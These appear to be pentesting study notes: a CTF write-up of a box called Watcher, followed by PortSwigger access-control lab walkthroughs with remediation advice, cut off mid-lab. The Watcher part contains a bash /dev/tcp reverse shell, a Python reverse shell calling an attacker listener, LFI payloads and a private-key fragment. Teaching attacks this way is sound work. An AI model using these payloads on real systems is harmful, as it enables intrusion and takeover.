MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM...
-----END RSA PRIVATE KEY-----

docs.title: Watcher
docs.text:
Room: Watcher · Difficulty: Medium · OS: Linux

A blog site's post.php?post= parameter is a local file include. It's used first to read a file the developer explicitly named "do not read," which hands over FTP credentials; those credentials let a PHP reverse shell be uploaded to a directory the LFI can also reach, turning the LFI into RCE. From www-data, the box is a chain of lateral pivots — a sudo rule to toby, a writable cron script to mat, a sudo script to will, and finally a base64-encoded root SSH key — each one gated behind its own flag.

docs.title: Port scan
docs.text:
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.148.109

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

FTP, SSH and HTTP — FTP is worth keeping in mind since the web app may end up disclosing credentials for it.

docs.title: Content discovery
docs.text:
ffuf -u "http://10.48.148.109/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r --recursion

css                     [Status: 200]
images                  [Status: 200]
robots.txt              [Status: 200]

docs.title: 2. Finding the LFI and leaking FTP creds
docs.text:
robots.txt names files the site owner explicitly didn't want crawled — which is often a map straight to what matters:

Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt


curl http://10.48.148.109/flag_1.txt

FLAG{robots_dot_text_what_is_next}

The site's blog posts are rendered through post.php?post=<name>.php:

That parameter takes a bare filename with no validation visible, so an absolute path is tried directly against the second robots.txt entry — and it works, confirming a local file include:

http://10.48.148.109/post.php?post=/var/www/html/secret_file_do_not_read.txt


Hi Mat, The credentials for the FTP server are below. I've set the files to be saved
to /home/ftpuser/ftp/files.
ftpuser:givemefiles777

docs.title: 3. Foothold — FTP upload + LFI = RCE
docs.text:
ftp 10.48.148.109
# ftpuser / givemefiles777
ls

drwxr-xr-x  2 1001 1001  files
-rw-r--r--  1 0    0     flag_2.txt

get flag_2.txt
cat flag_2.txt

FLAG{ftp_you_and_me}

Since the LFI includes and executes any PHP it's pointed at, uploading a PHP reverse shell into the FTP-writable files/ directory and then including it through post.php is enough to run it on the server:

ftp> put reverse.php

5497 bytes sent in 00:00 (335.48 KiB/s)

With a listener running, the shell is triggered by requesting:

http://10.48.148.109/post.php?post=/home/ftpuser/ftp/files/reverse.php

(The first attempt fails because the listener isn't up yet — a second request, after starting nc, succeeds.)

nc -lvnp 4444

connect to [192.168.158.240] from (UNKNOWN) [10.48.183.33] 35608
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Back in the web root as www-data, a hidden directory yields the next flag:

cd /var/www/html
ls
cd more_secrets_a9f10a
cat flag_3.txt

FLAG{lfi_what_a_guy}

docs.title: 4. Pivot 1 — www-data → toby via sudo
docs.text:
sudo -l

User www-data may run the following commands on ip-10-48-183-33:
    (toby) NOPASSWD: ALL

sudo -u toby /bin/bash
whoami

toby

cat flag_4.txt

FLAG{chad_lifestyle}

docs.title: 5. Pivot 2 — toby → mat via a cron job
docs.text:
toby's home directory has a jobs/ folder containing cow.sh, writable by toby and (per the timing in later output) run periodically as mat:

echo "bash -i >& /dev/tcp/192.168.158.240/4445 0>&1" >> /home/toby/jobs/cow.sh
cat cow.sh

#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
bash -i >& /dev/tcp/192.168.158.240/4445 0>&1

nc -lvnp 4445

connect to [192.168.158.240] from (UNKNOWN) [10.48.183.33] 54894
mat@ip-10-48-183-33:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}

docs.title: 6. Pivot 3 — mat → will via a sudo script
docs.text:
mat has a scripts/ directory and a sudo rule to run a specific Python script as will. That script imports a module (cmd.py) from the same directory by its function name, so planting a file called cmd.py with a reverse-shell get_command function hijacks the import:

echo 'import socket,subprocess,os
def get_command(num):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.158.240",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])' > /home/mat/scripts/cmd.py

sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1

will@ip-10-48-183-33:~$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}

docs.title: 7. Privilege escalation — backed-up root SSH key
docs.text:
cd /opt
ls
cd backups
ls

key.b64

A base64-encoded private key sitting in a backups directory is exactly what it looks like — it's decoded and used to SSH in directly as root:

cat key.b64 | base64 -d > /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa root@10.48.183.33

docs.title: Root flag
docs.text:
cat flag_7.txt

FLAG{who_watches_the_watchers}

docs.title: Web Application Pentesting
docs.text: This section introduces core web application security concepts in plain language, then works through each vulnerability class with the basics behind it, how it is exploited, how impact is proven, and how it is prevented — with hands-on lab walkthroughs. Use the navigation to jump to a vulnerability class.

docs.title: Access Control & Broken Access Control
docs.text:
Access control is the mechanism that decides what an authenticated user is allowed to do. Authentication answers "who are you?"; access control answers the next question — "are you allowed to do this, to this resource?". When that check is missing, incomplete, or trusts something the user can change, you have broken access control — consistently one of the most common and highest-impact classes of web vulnerability (OWASP Top 10 A01:2021).

The core idea is simple: a user requests an action or a resource, and the server must confirm the user's identity is permitted for that specific action or resource before carrying it out. Most access-control bugs come from the server skipping that confirmation and instead trusting the request itself — a parameter, a cookie, a URL path, an HTTP header, or simply the fact that the user reached the page at all.

docs.title: The three kinds of access control
docs.text: Access controls are usually grouped by the relationship between the user and what they are trying to reach.

docs.title: Vertical access control
docs.text:
Vertical controls separate users of different privilege levels. An ordinary customer should not reach administrative functions such as deleting accounts or managing users. When vertical controls break, a low-privilege user gains access to higher-privilege functionality — this is privilege escalation.

Typical causes:

  • An admin panel that performs no role check (it relies on the link being hidden).
  • A role stored in a value the client can edit (a cookie, a hidden field, a request parameter).
  • A front-end that hides the admin link but a back-end that never enforces the restriction.

docs.title: Horizontal access control
docs.text: Horizontal controls separate users of the same privilege level from each other. You are allowed to view your account, not another customer's. When these break, a user reaches another user's data or actions — this is horizontal privilege escalation, and the classic form is IDOR.

docs.title: Context-dependent access control
docs.text: Context-dependent controls enforce the order and state of a process — for example, you should not be able to confirm an order after the payment step has been skipped, or complete step 3 of an admin workflow without completing steps 1 and 2 as an administrator.

docs.title: IDOR — Insecure Direct Object Reference
docs.text:
IDOR is the best-known horizontal access-control flaw. It occurs when an application exposes a direct reference to an internal object — a user ID, a filename, an account number, a document ID — in a parameter, and then uses that reference to fetch the object without checking that the current user is allowed to access it.

GET /my-account?id=carlos HTTP/1.1

If the server returns Carlos's account simply because the request said id=carlos, the reference is insecure. IDOR is not limited to tidy sequential integers. GUIDs, hashes and filenames are all still IDOR if the value can be discovered or guessed anywhere else in the application and the server performs no ownership check.

IDOR is a symptom, not a separate bug class

IDOR is broken access control applied to a direct object reference. The fix is always the same idea: the server must verify ownership or permission, never trust the identifier the client supplied.

docs.title: Why broken access control matters — impact
docs.text:
Because access control is the boundary protecting data and functionality, the impact is frequently severe:

  • Data exposure — reading other users' accounts, messages, API keys, documents (horizontal).
  • Account takeover — disclosed passwords or password-reset data lead directly to logging in as another user.
  • Privilege escalation — reaching admin functionality lets an attacker create, modify or delete users and data (vertical).
  • Full application compromise — admin access often exposes further internal functionality and infrastructure.

docs.title: How to prevent it
docs.text:
1. Deny by default. Every resource and action should be forbidden unless a rule explicitly allows the requesting user.
  2. Enforce on the server, for every request. Never rely on hiding a link or disabling a button. The back-end must re-check on each request, including direct requests that bypass the UI.
  3. Check ownership, not just authentication. For object references, confirm the object belongs to (or is permitted for) the current session — do not trust an id parameter.
  4. Don't trust client-controlled state. Roles, privileges and identity must come from the server-side session, never from a cookie value, hidden field, or request parameter the user can edit.
  5. Apply controls consistently across methods and paths. The same rule must hold for GET, POST, alternative HTTP methods, and for any header (X-Original-URL, Referer) the framework honours.
  6. Avoid security through obscurity. Unpredictable URLs and non-sequential IDs are not access control; they are only speed bumps.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • Unprotected admin functionality
  • Unprotected admin functionality with unpredictable URL
  • User role controlled by request parameter
  • User role can be modified in user profile
  • User ID controlled by request parameter
  • User ID controlled by request parameter, with unpredictable user IDs
  • User ID controlled by request parameter with data leakage in redirect
  • User ID controlled by request parameter with password disclosure
  • Insecure direct object references (IDOR)
  • URL-based access control can be circumvented
  • Method-based access control can be circumvented
  • Multi-step process with no access control on one step
  • Referer-based access control

docs.title: Insecure direct object references (IDOR)
docs.text:
Lab: PortSwigger Web Security Academy — Insecure direct object references (Apprentice).

This lab stores user chat logs directly on the server's file system and retrieves them using static URLs. Solve the lab by finding the password for the user carlos and logging into their account.

IDOR is not limited to database IDs in a query string. Here the "object" is a file: chat transcripts are saved as numbered text files and served from a predictable path. Anyone who can request a filename can read it.

docs.title: 1. Find the transcript feature
docs.text: Open Live chat, send a message, then click View transcript. The browser downloads a file from a static URL:

docs.title: 2. Notice the numbered filename
docs.text:
Intercept the download. The transcript is requested by an incrementing number:

GET /download-transcript/1.txt HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net

The filename is just a counter, so transcripts saved by other users sit at neighbouring numbers. Your own transcript does not need to be the one you read.

docs.title: 3. Request another user's file
docs.text: Send the request to Repeater and request a different number (the lowest, 1.txt, is a good start). The response is somebody else's conversation, and in it the user tells the support agent their password:

docs.title: 4. Log in as carlos
docs.text: Use the leaked password with the username carlos on the login page. The My Account page for carlos confirms access and solves the lab.

docs.title: Why the attack works
docs.text: The files are directly reachable by name, the names are sequential, and the download handler never checks that the requesting session owns the transcript. Sensitive content (a password) had also been written into the chat log in plain text.

docs.title: Remediation
docs.text: Do not serve user-generated files by predictable names. Look transcripts up by an identifier tied to the authenticated session and verify ownership on every request. Never store credentials in chat logs.

docs.title: Method-based access control can be circumvented
docs.text:
Lab: PortSwigger Web Security Academy — Method-based access control can be circumvented (Practitioner).

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using administrator:admin. To solve the lab, log in using wiener:peter and exploit the flawed access controls to promote yourself to administrator.

Some applications enforce permissions per HTTP method: for example "only admins may POST /admin-roles". If another method that reaches the same handler is not covered by that rule, a low-privileged user can perform the same action by simply changing the method.

HTTP methods worth testing

GET (parameters in the URL, often logged less strictly), POST, PUT/PATCH (update, often overlooked in authorization checks), DELETE (high impact), HEAD, OPTIONS (lists allowed methods), TRACE. Also try non-standard verbs and method-override headers such as X-HTTP-Method-Override.

docs.title: 1. Capture the privileged request
docs.text:
Log in as administrator:admin, open the admin panel and promote carlos. Send the resulting request to Burp Repeater:

POST /admin-roles HTTP/2
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade

docs.title: 2. Replay it as the low-privileged user
docs.text:
Open a private window and log in as wiener:peter. Copy wiener's session cookie into the Repeater request and resend the same POST. The application refuses:

"Unauthorized"

docs.title: 3. Probe how the method is handled
docs.text:
Change the method to something unknown. A bogus verb passes the authorization layer and fails later with a different error, which tells you the access rule is keyed on POST:

UPDATE /admin-roles HTTP/2
...
username=carlos&action=upgrade

HTTP/2 400 Bad Request
"Missing parameter 'username'"

The error is about a missing parameter, not about authorization. The handler is now reading the parameters from somewhere else (the query string).

docs.title: 4. Promote yourself
docs.text:
Switch the request to GET (Repeater: right-click, Change request method) and put the parameters in the URL, using your own username:

GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=WIENER-SESSION

The server returns 302 Found with Location: /admin, confirming the upgrade:

Refresh the account page in the browser to see the lab solved.

docs.title: Why the attack works
docs.text: The authorization rule was bound to a single HTTP method instead of to the action. The framework routed GET (and unknown verbs) to the same handler, but only POST was checked.

docs.title: Remediation
docs.text: Authorize the operation, not the verb: apply the same role check to the handler regardless of method, and explicitly deny methods you do not use. State-changing actions should accept only POST (with CSRF protection) and reject everything else with 405 Method Not Allowed.

docs.title: Multi-step process with no access control on one step
docs.text:
Lab: PortSwigger Web Security Academy — Multi-step process with no access control on one step (Practitioner).

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using administrator:admin. To solve the lab, log in using wiener:peter and exploit the flawed access controls to promote yourself to administrator.

This is a context-dependent access-control failure. Many sensitive actions are split into steps — select the user, then confirm. Developers often secure the first step carefully and assume nobody can reach the later ones without going through it. If a later step performs the real change but does not check the role itself, an attacker can jump straight to it.

docs.title: 1. Walk through the process as admin
docs.text:
Log in as administrator:admin, open the admin panel and promote carlos. The flow has two requests:

  1. A request that selects the user and action and shows a confirmation page.
  2. A second request that carries confirmed=true and actually changes the role.

Send the confirmation request (step two) to Burp Repeater:

POST /admin-roles HTTP/2
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=carlos

docs.title: 2. Replay it as the normal user
docs.text:
Open a private window and log in as wiener:peter. Copy wiener's session cookie into the saved Repeater request and change the username to your own:

POST /admin-roles HTTP/2
Cookie: session=WIENER-SESSION

action=upgrade&confirmed=true&username=wiener

The request succeeds. The first step was protected; the second was not, and it does not repeat the role check.

docs.title: 3. Confirm
docs.text: Reload wiener's session in the browser. The Admin panel link is now available and the lab is solved.

docs.title: Why the attack works
docs.text: The access control lived only in step one of the workflow. Step two trusted that the caller had already been authorized, but it is an ordinary HTTP endpoint that can be called directly, in any order, by any logged-in user.

docs.title: Remediation
docs.text: Every step that changes state must enforce authorization independently. Do not use "the user reached this page" as proof of permission. Server-side state for multi-step flows should record who started the process and what step they are on.

docs.title: Referer-based access control
docs.text:
Lab: PortSwigger Web Security Academy — Referer-based access control (Practitioner).

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using administrator:admin. To solve the lab, log in using wiener:peter and exploit the flawed access controls to promote yourself to administrator.

The Referer header tells the server which page linked to the current request. Some applications use it as a shortcut: "if the request came from /admin, the user must be an admin". But the Referer is set by the client. A request tool can send any value, so this is not access control at all.

docs.title: 1. Capture the privileged request
docs.text:
Log in as administrator:admin, open the admin panel and promote carlos. Send the request to Burp Repeater:

GET /admin-roles?username=carlos&action=upgrade HTTP/2
Referer: https://YOUR-LAB-ID.web-security-academy.net/admin

docs.title: 2. Test as the normal user
docs.text:
In a private window, log in as wiener:peter and browse directly to:

/admin-roles?username=carlos&action=upgrade

It is rejected as unauthorized because the request has no Referer pointing at the admin page. That reveals the header is what the application is checking.

docs.title: 3. Forge the Referer
docs.text:
Copy wiener's session cookie into the saved Repeater request, change the username to your own and replay it. The Referer still points at /admin, so the check passes:

GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=WIENER-SESSION
Referer: https://YOUR-LAB-ID.web-security-academy.net/admin

wiener is now an administrator and the lab is solved.

docs.title: Why the attack works
docs.text: The application substituted an attacker-controllable header for a real authorization check. Any header the client sends — Referer, Origin, X-Forwarded-For, User-Agent — can be forged outside a browser.

docs.title: Remediation
docs.text: Check the role of the session user on the server. If you want to check where a request came from for CSRF defence, use anti-CSRF tokens and SameSite cookies, and never treat the Referer as proof of privilege.

docs.title: Unprotected admin functionality with unpredictable URL
docs.text:
Lab: PortSwigger Web Security Academy — Unprotected admin functionality with unpredictable URL (Apprentice).

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application. Solve the lab by accessing the admin panel, and using it to delete the user carlos.

Like the previous lab, the admin panel has no access control — but this time the URL is randomised, so it cannot simply be guessed. The twist is that the client-side code still needs to know where the panel is in order to show the admin link to real admins, so the location leaks in the page source.

docs.title: 1. View the page source
docs.text:
Open the home page and view its source (view-source: or right-click → View Page Source). Applications often render an admin link conditionally in JavaScript — and to do that, the script has to contain the admin URL even when the link is not displayed:

var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-b52kbd');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
}

The unpredictable path — here /admin-b52kbd — is hard-coded in the script even though isAdmin is false.

docs.title: 2. Browse to the disclosed path
docs.text:
Navigate directly to the leaked URL:

https://YOUR-LAB-ID.web-security-academy.net/admin-b52kbd

The admin panel loads with no authentication required. Click Delete next to carlos.

docs.title: 3. Confirm the solve
docs.text: The user is deleted and the lab is marked solved.

docs.title: Why the attack works
docs.text: An unpredictable URL is security through obscurity, not access control. Because the panel itself performs no role check, anyone who learns the path can use it — and the path is disclosed by client-side JavaScript that must reference it to build the admin link. Hiding the link in a false branch does not hide it from anyone who reads the source.

docs.title: Remediation
docs.text: Enforce server-side authorization on the admin panel and its actions. Never rely on an unguessable URL as the control, and do not ship admin URLs to clients that are not administrators — decide server-side whether to render privileged links.

docs.title: Unprotected admin functionality
docs.text:
Lab: PortSwigger Web Security Academy — Unprotected admin functionality (Apprentice).

This lab has an unprotected admin panel. Solve the lab by deleting the user carlos.

This is the simplest form of broken vertical access control. The admin panel exists and performs real, privileged actions, but the application protects it only by not linking to it — there is no role check at all. Anyone who learns the URL can use it.

docs.title: 1. Look for the admin path
docs.text:
When a sensitive path is "hidden", it is often still referenced somewhere the application never meant an attacker to read — commonly robots.txt, which lists paths the site asks crawlers to avoid, or it is simply guessable with content discovery.

Running a content-discovery scan against the site surfaces the usual endpoints and, importantly, robots.txt:

$ ffuf -u https://YOUR-LAB-ID.web-security-academy.net/FUZZ -w /usr/share/wordlists/dirb/common.txt

login                   [Status: 200, ...]
my-account              [Status: 302, ...]
robots.txt              [Status: 200, Size: 45, ...]

docs.title: 2. Read robots.txt
docs.text:
Browse to /robots.txt. It discloses the admin path in its Disallow directive:

User-agent: *
Disallow: /administrator-panel

robots.txt is a disclosure, not a control

Disallow only asks well-behaved crawlers to stay away. It advertises the path to everyone else and enforces nothing.

docs.title: 3. Use the admin panel
docs.text:
Navigate directly to the disclosed path:

https://YOUR-LAB-ID.web-security-academy.net/administrator-panel

The admin panel loads with no authentication or role check. Click Delete next to carlos.

The user is removed and the lab is solved.

docs.title: Why the attack works
docs.text: The application assumes that because the admin panel is not linked from the normal UI, ordinary users will never reach it. But the back-end performs no authorization check on the panel or its delete function. Requesting the URL directly is enough. Disclosing that URL in robots.txt removes even the need to guess it.

docs.title: Remediation
docs.text: Enforce an explicit server-side role check on the admin panel and every action it exposes, so that any request from a non-administrator is rejected regardless of how the URL was obtained. Do not rely on secrecy of the path, and never advertise sensitive paths in robots.txt.

docs.title: URL-based access control can be circumvented
docs.text:
Lab: PortSwigger Web Security Academy — URL-based access control can be circumvented (Practitioner).

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header. To solve the lab, access the admin panel and delete the user carlos.

Some architectures put a reverse proxy or WAF in front of the application and enforce access control there, by matching the request path. If the back-end framework also supports headers that override the path (X-Original-URL, X-Rewrite-URL), an attacker can send an allowed path in the request line to pass the front-end check and put the forbidden path in the header for the back-end to act on. The two components disagree about what the "real" URL is.

X-Original-URL in testing

Methodology: intercept a request, keep the request line benign (for example GET /), add X-Original-URL: /restricted/path, and see whether the response corresponds to the injected path. Also try X-Rewrite-URL, encoded paths (%2fadmin) and full URLs.

docs.title: 1. Confirm the front-end block
docs.text:
Request /admin directly. The front-end rejects it:

GET /admin HTTP/2

HTTP/2 403 Forbidden

"Access denied"

The response is a bare JSON string rather than the application's normal error page, which suggests the block is done by a front-end layer, not by the application.

docs.title: 2. Reach /admin through the header
docs.text:
Change the request line to / and put the real target in X-Original-URL:

GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin

The front-end sees / (allowed), the back-end processes /admin, and the admin panel is returned, including the delete links:

docs.title: 3. Delete carlos
docs.text:
The delete action is /admin/delete?username=carlos. Keep the path as /, move the path into the header, and pass the query string on the real request line, because the back-end reads parameters from the request, not from the header:

GET /?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin/delete

The 302 redirect to /admin confirms the deletion:

Reload the site to see the lab solved.

docs.title: Why the attack works
docs.text: Access control was enforced on the wrong layer using the wrong data: the front-end authorises on the path in the request line, while the framework behind it trusts a client-controlled header to decide the route. Neither layer is the single source of truth.

docs.title: Remediation
docs.text: Do not enforce authorization solely at a perimeter proxy. The application must check the user's role on the resource itself. Disable or strip X-Original-URL / X-Rewrite-URL at the edge unless they are genuinely required, and ensure the proxy and application agree on the final URL.

docs.title: User ID controlled by request parameter
docs.text:
Lab: PortSwigger Web Security Academy — User ID controlled by request parameter (Apprentice).

This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. Credentials: wiener:peter.

This is the textbook horizontal access-control bug. The account page decides whose data to show from a value in the URL (id) instead of from the logged-in session. Because the parameter is a plain, guessable username, changing it is all it takes to read another user's account.

docs.title: 1. Log in and find the identifier
docs.text:
Log in as wiener:peter.

Open My account. The URL carries the account identifier in a query parameter, and the page shows the user's API key:

/my-account?id=wiener

docs.title: 2. Change the identifier
docs.text:
The id value is simply the username. Replace it with the victim:

/my-account?id=carlos

docs.title: 3. Read the victim's API key
docs.text:
The server returns Carlos's account page, including his API key, even though the session still belongs to wiener.

Copy the key and submit it to solve the lab.

docs.title: Why the attack works
docs.text: The server uses the client-supplied id to decide which record to load, and never compares it with the identity stored in the session. Authentication succeeded ("you are wiener"), but authorization ("is wiener allowed to see carlos?") was never evaluated.

docs.title: Remediation
docs.text: Derive the account from the server-side session (/my-account with no id at all), or if an identifier must be accepted, verify that it matches the authenticated user before returning data. Non-admin users should receive 403 for any other value.

docs.title: User ID controlled by request parameter with data leakage in redirect
docs.text:
Lab: PortSwigger Web Security Academy — User ID controlled by request parameter with data leakage in redirect (Apprentice).

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response. To solve the lab, obtain the API key for the user carlos and submit it as the solution. Credentials: wiener:peter.

In the browser this lab appears to be secure: asking for Carlos's account sends you away to the login page. The flaw is only visible in the raw HTTP traffic. The application detects the unauthorized access and issues a redirect, but it builds the full page first and leaves it in the body of the 302 response. Browsers follow the Location header and discard the body; a proxy shows it.

docs.title: 1. Request another user's account in a proxy
docs.text:
Log in as wiener, open My account, and send the request to Burp Repeater. Change the id parameter:

GET /my-account?id=carlos HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION

docs.title: 2. Read the redirect body
docs.text:
The response is a redirect, but its body contains Carlos's account page, including the API key:

Copy the API key and submit it to solve the lab.

docs.title: Why the attack works
docs.text:
The access check runs after the sensitive response has already been generated, and the redirect is attached to a response that still carries the protected content. The authorization decision changed the status code but not the data.

Always inspect redirects in a proxy

Browsers hide the body of 3xx responses. When an endpoint "blocks" you with a redirect, look at the redirect response itself in Burp.

docs.title: Remediation
docs.text: Make the authorization check happen before any protected data is read, and return an empty body (or an error page) with the redirect or a 403. Never rely on the client following a redirect to protect content.

docs.title: User ID controlled by request parameter with password disclosure
docs.text:
Lab: PortSwigger Web Security Academy — User ID controlled by request parameter with password disclosure (Apprentice).

This lab has a user account page that contains the current user's existing password, prefilled in a masked input. To solve the lab, retrieve the administrator's password, then use it to delete the user carlos. Credentials: wiener:peter.

This lab chains two weaknesses: an IDOR that lets a normal user load the administrator's account page, and a page that places the real password in the HTML. A masked type="password" input hides the characters on screen but the value is still in the page source.

docs.title: 1. Load the administrator's account
docs.text:
Log in as wiener. The account URL uses the username as the identifier. Change it to the administrator:

/my-account?id=administrator

The page loads the administrator's settings, with the password field filled in as dots:

docs.title: 2. Recover the password from the HTML
docs.text:
Masked inputs still carry their value in the DOM. Open the browser developer tools, inspect the password field, and read its value attribute:

<input required type="password" name="password" value="ADMIN-PASSWORD-HERE">

docs.title: 3. Log in as the administrator
docs.text: Log out, then sign in as administrator with the recovered password. An Admin panel link now appears in the navigation.

docs.title: 4. Delete carlos
docs.text: Open the admin panel and delete carlos to solve the lab.

docs.title: Why the attack works
docs.text:
Two independent mistakes combine into account takeover:

  1. The account endpoint trusts the id parameter instead of the session (horizontal and, here, vertical escalation, because the target is an admin).
  2. The application echoes a secret back to the client. Passwords should never be sent to the browser after they are set.

docs.title: Remediation
docs.text: Enforce that the requested account matches the logged-in user. Never prefill password fields: store only a salted hash, and have the change-password form ask for the current and new password rather than displaying the stored one.

docs.title: User ID controlled by request parameter, with unpredictable user IDs
docs.text:
Lab: PortSwigger Web Security Academy — User ID controlled by request parameter, with unpredictable user IDs (Apprentice).

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. To solve the lab, find the GUID for carlos, then submit his API key. Credentials: wiener:peter.

Replacing sequential IDs or usernames with GUIDs stops guessing, but it does not fix access control. If a GUID can be discovered somewhere else in the application and the account page still performs no ownership check, it is the same IDOR.

docs.title: 1. Look for places GUIDs are leaked
docs.text: The account page uses a GUID in the id parameter, so it cannot be brute-forced. Instead, look for features that expose other users' GUIDs. In this lab, every blog post links its author to a page that lists the author's posts. Open a post written by carlos:

docs.title: 2. Harvest carlos's GUID
docs.text:
Clicking the author name goes to a URL that contains the author's identifier:

/blogs?userId=73f43378-c49f-4788-b465-ad14b5b09aff

docs.title: 3. Use the GUID on the account page
docs.text:
Log in as wiener, then request the account page with Carlos's GUID in place of your own:

/my-account?id=73f43378-c49f-4788-b465-ad14b5b09aff

The response is Carlos's account, with his API key.

Submit the key to solve the lab.

docs.title: Why the attack works
docs.text: Unpredictable identifiers are obscurity, not authorization. The application leaks the GUID in a public page and then accepts any valid GUID on the sensitive endpoint without checking that it belongs to the logged-in user.

docs.title: Remediation
docs.text: Enforce ownership on every request, regardless of how hard the identifier is to guess. Avoid exposing internal user GUIDs in public pages and use a separate public handle (display name, slug) for linking.

docs.title: User role controlled by request parameter
docs.text:
Lab: PortSwigger Web Security Academy — User role controlled by request parameter (Apprentice).

This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie. Solve the lab by accessing the admin panel and using it to delete the user carlos. Credentials: wiener:peter.

This is a vertical privilege-escalation flaw caused by trusting a client-controlled value for the access decision. The application reads an Admin cookie to decide whether you are an administrator — but the browser (and therefore the user) can set that cookie to anything.

docs.title: 1. Log in and inspect your cookies
docs.text: Log in as wiener:peter, then open your browser's developer tools and look at the cookies for the site. Alongside the session cookie there is an Admin cookie set to false:

docs.title: 2. Forge the Admin cookie
docs.text: Edit the Admin cookie value from false to true (any cookie editor, Burp, or the dev-tools storage panel works):

docs.title: 3. Reload and open the admin panel
docs.text: Reload the account page. Because the application now reads Admin=true, it renders the Admin panel link:

docs.title: 4. Delete carlos
docs.text:
Open the admin panel at /admin and click Delete next to carlos:

The lab is solved.

docs.title: Why the attack works
docs.text: The application makes its authorization decision from the Admin cookie, which is supplied by the client. Cookies are fully under the user's control, so claiming Admin=true is trivial. Identity and role must be derived from trusted server-side session state, not echoed back to the client in an editable value.

docs.title: Remediation
docs.text: Store the user's role server-side, keyed to the authenticated session, and look it up on each request. Never make an access decision based on a cookie or any other value the client can modify.

docs.title: User role can be modified in user profile
docs.text:
Lab: PortSwigger Web Security Academy — User role can be modified in user profile (Practitioner).

This lab has an admin panel at /admin, only accessible to logged-in users with a roleid of 2. Solve the lab by accessing the admin panel and using it to delete the user carlos. Credentials: wiener:peter.

This is a mass-assignment access-control flaw. The profile-update endpoint accepts a JSON body and binds whatever fields it receives straight onto the user record — including roleid, which controls privilege. By adding that field ourselves we promote our own account.

docs.title: 1. Capture the change-email request
docs.text:
Log in as wiener:peter, go to My account, submit the Update email form, and capture the request in Burp. The account page is a JSON API: the update sends {"email":"..."} and the response echoes the full user object, which reveals the field that matters — roleid:

POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: text/plain;charset=UTF-8

{
    "email":"hello@vapt.in"
}

The response includes the current role:

{
    "username":"wiener",
    "email":"hello@vapt.in",
    "apikey":"4kPxWBbb6Jm2uS84wuyPoOeoEsw8dbfN",
    "roleid":1
}

docs.title: 2. Add roleid to the request body
docs.text:
Send the request to Repeater and add a roleid field with the admin value 2 to the JSON body:

POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: text/plain;charset=UTF-8

{
    "email":"hello@vapt.in",
    "roleid":2
}

The response now shows "roleid":2 — the endpoint accepted and stored our injected field:

docs.title: 3. Open the admin panel and delete carlos
docs.text:
Reload the account page; the Admin panel link now appears. Open /admin and click Delete next to carlos:

The lab is solved.

docs.title: Why the attack works
docs.text: The endpoint performs mass assignment: it binds every field in the request body to the user model without an allow-list. roleid is a sensitive, privilege-controlling field that should never be writable by the user, but the API never distinguishes it from the harmless email field.

docs.title: Remediation
docs.text: Bind only an explicit allow-list of fields that a user is permitted to change (here, just email). Keep privilege-controlling fields such as roleid strictly server-managed, and reject or ignore any attempt to set them from client input.

docs.title: Username enumeration via different responses
docs.text:
Lab: PortSwigger Web Security Academy — Username enumeration via different responses (Apprentice).

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, found in the candidate wordlists. To solve the lab, enumerate a valid username, brute-force that user's password, then access their account page.

docs.title: BASICS: why the login form leaks who exists
docs.text:
A login form normally returns one generic failure message for any wrong attempt. This lab's form instead distinguishes the two failure cases:

  • Username does not exist → one message (or response shape).
  • Username exists, password is wrong → a different message (or response shape).

Comparing the two responses tells the attacker whether a candidate username is valid — without ever learning the password — which turns an enormous (username × password) search into two much smaller, sequential searches.

docs.title: 1. Capture a failed login attempt
docs.text: Submit any username/password pair and intercept the POST /login request in Burp, then send it to Intruder.

docs.title: 2. Brute-force the username
docs.text:
